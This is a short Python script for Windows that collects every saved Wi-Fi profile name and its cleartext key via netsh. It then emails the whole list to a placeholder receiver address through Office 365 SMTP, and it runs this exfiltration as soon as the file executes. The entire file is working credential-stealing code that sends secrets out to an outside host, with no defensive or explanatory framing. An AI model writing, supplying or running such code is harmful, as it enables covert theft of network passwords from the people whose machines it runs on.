import subprocess
import re
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def get_ssid():
    cmd_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
    ssids = re.findall("All User Profile\s+:\s+(.*)\r", cmd_output)

    return ssids

def get_passwords():
    wifi_passwords = []
    ssids = get_ssid()   
    if ssids:
        for ssid in ssids:
            cmd_output = subprocess.run(["netsh", "wlan", "show", "profile", ssid, "key=clear"], capture_output=True).stdout.decode()
            passwords = re.findall("Key Content\s+:\s+(.*)\r", cmd_output)
            if passwords:
                password = passwords[0]
            else:
                password = None
                
            wifi_passwords.append({"SSID" : ssid, "Password" : password})

        return wifi_passwords
    
    else:
        print("[!] No SSIDs & passwords found")
        
def return_passwords():
    wifi_passwords = get_passwords()
    passwords = ""
    for password in wifi_passwords:
        passwords += f"\n{password}"
        
    # settings for the email
    sender = "<sender email>"
    receiver = "<receiver email>"
    subject = "WiFi Passwords"
    message = passwords
    smtp_server = "smtp.office365.com"
    smtp_port = "587"
    password = "<sender password>"

    # start TLS & login
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(sender, password)

    # create a multipart
    email = MIMEMultipart()
    email["From"] = sender
    email["To"] = receiver
    email["Subject"] = subject

    # attach message to email
    email.attach(MIMEText(message, "plain"))

    # send email
    server.sendmail(sender, receiver, email.as_string())

return_passwords()